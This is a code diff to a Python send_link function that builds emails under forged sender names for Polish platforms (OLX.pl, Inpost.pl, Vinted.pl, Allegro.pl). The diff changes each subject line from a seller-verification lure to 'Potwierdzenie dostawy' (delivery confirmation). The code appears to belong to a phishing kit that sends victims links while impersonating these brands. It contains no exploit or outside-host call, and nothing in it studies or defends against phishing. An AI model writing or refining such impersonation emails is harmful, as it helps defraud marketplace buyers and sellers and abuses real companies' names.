@@ -164,27 +164,27 @@ def send_link(name, recipient, link):
             message = MIMEMultipart()
             message["From"] = f"OLX.pl <{otp}>"
             message["To"] = recipient
-            message["Subject"] = "Wymagana jest weryfikacja Sprzedawcy w celu sprzedaży"
+            message["Subject"] = "Potwierdzenie dostawy"
 
         elif name == 'inpost.py':
             message = MIMEMultipart()
             message["From"] = f"Inpost.pl <{otp}>"
             message["To"] = recipient
-            message["Subject"] = "Wymagana jest weryfikacja Sprzedawcy w celu sprzedaży"
+            message["Subject"] = "Potwierdzenie dostawy"
 
 
         elif name == 'vinted.py':
             message = MIMEMultipart()
             message["From"] = f"Vinted.pl <{otp}>"
             message["To"] = recipient
-            message["Subject"] = "Wymagana jest weryfikacja Sprzedawcy w celu sprzedaży"
+            message["Subject"] = "Potwierdzenie dostawy"
 
 
         elif name == 'allegro.py':
             message = MIMEMultipart()
             message["From"] = f"Allegro.pl <{otp}>"
             message["To"] = recipient
-            message["Subject"] = "Wymagana jest weryfikacja Sprzedawcy w celu sprzedaży"
+            message["Subject"] = "Potwierdzenie dostawy"
 
         else:
             return False
